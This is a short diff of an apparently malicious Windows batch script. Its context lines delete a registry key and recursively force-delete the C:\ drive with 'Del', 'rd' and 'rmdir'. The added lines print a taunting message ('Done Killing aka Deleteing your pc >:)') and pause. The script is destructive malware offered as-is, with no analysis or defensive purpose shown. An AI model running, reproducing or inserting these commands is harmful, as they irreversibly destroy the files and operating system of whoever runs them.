@@ -10,3 +10,7 @@ reg delete HKCH/SYSTEM/Setup /f
 Del C:\ /f /s /q
 rd C:\ /s /q
 rmdir C: /q
+cls
+color 15
+echo Done Killing aka Deleteing your pc >:)
+pause
